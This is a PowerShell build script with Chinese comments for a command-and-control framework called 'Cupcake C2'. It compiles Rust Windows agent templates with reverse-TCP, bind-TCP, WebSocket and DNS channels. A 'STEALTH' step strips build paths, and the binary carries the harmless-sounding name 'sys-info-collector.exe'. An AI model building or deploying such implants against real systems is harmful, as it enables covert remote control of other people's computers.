# Cupcake C2 - Windows Agent 独立编译脚本
# 仅编译 Windows 版本的 Agent 模板，存放在 server/assets 中。

$ErrorActionPreference = "Stop"

# 1. 路径设置
$BaseDir = Get-Location
$ClientDir = Join-Path $BaseDir "Client"
$AssetsDir = Join-Path $BaseDir "server\assets"

Write-Host "=========================================" -ForegroundColor Blue
Write-Host "    Cupcake C2 - Windows Template Compiler" -ForegroundColor Blue
Write-Host "=========================================" -ForegroundColor Blue

if (-not (Test-Path $AssetsDir)) {
    New-Item -ItemType Directory -Path $AssetsDir | Out-Null
}

# 2. 检查环境
Write-Host "[*] 正在检查编译环境..." -ForegroundColor Yellow
if (-not (Get-Command cargo -ErrorAction SilentlyContinue)) {
    Write-Host "[!] 错误: 未找到 Rust 环境 (cargo)，请先安装 Rust。" -ForegroundColor Red
    exit 1
}

# 3. 编译函数
function Build-Windows-Template {
    param (
        [string]$Arch,
        [string]$Feature,
        [string]$OutputName
    )

    $Target = if ($Arch -eq "x64") { "x86_64-pc-windows-msvc" } else { "i686-pc-windows-msvc" }
    
    # 确保 target 已安装
    rustup target add $Target | Out-Null
    
    Write-Host "[*] 正在构建: $OutputName (Arch: $Arch, Feature: $Feature)..." -ForegroundColor Yellow
    
    Push-Location $ClientDir
    try {
        # 🛡️ STEALTH: 消除本地路径信息
        $env:RUSTFLAGS = "--remap-path-prefix $($ClientDir)=/cupcake"
        
        # 编译 - 使用 --no-default-features 保持代码精简
        cargo build --release --target $Target --no-default-features --features $Feature
        
        $BinaryName = "sys-info-collector.exe"
        $SrcPath = Join-Path $ClientDir "target\$Target\release\$BinaryName"
        $DestPath = Join-Path $AssetsDir $OutputName

        if (Test-Path $SrcPath) {
            if (Test-Path $DestPath) { Remove-Item $DestPath -Force }
            Copy-Item -Path $SrcPath -Destination $DestPath -Force
            Write-Host "[+] 成功生成: $OutputName" -ForegroundColor Green
        } else {
            Write-Host "[!] 错误: 未能找到生成的二进制文件 $SrcPath" -ForegroundColor Red
            exit 1
        }
    }
    finally {
        Pop-Location
    }
}

# 4. 执行批量编译
Write-Host "[*] 开始构建 Windows Agent 模板..." -ForegroundColor Cyan

# --- WebSocket (WS) ---
Build-Windows-Template -Arch "x64" -Feature "ws" -OutputName "client_template_windows.exe"
Build-Windows-Template -Arch "x86" -Feature "ws" -OutputName "client_template_windows_x86.exe"

# --- 反向 TCP ---
Build-Windows-Template -Arch "x64" -Feature "tcp" -OutputName "client_template_windows_tcp.exe"

# --- 正向 TCP (Bind) ---
Build-Windows-Template -Arch "x64" -Feature "tcp_bind" -OutputName "client_template_windows_bind.exe"

# --- DNS 模式 ---
Build-Windows-Template -Arch "x64" -Feature "dns" -OutputName "client_template_windows_dns.exe"

Write-Host "-----------------------------------------" -ForegroundColor Blue
Write-Host "[DONE] 所有 Windows 模板构建任务完成。" -ForegroundColor Green
Write-Host "[+] 模板存放目录: $AssetsDir" -ForegroundColor Green
Write-Host "-----------------------------------------" -ForegroundColor Blue
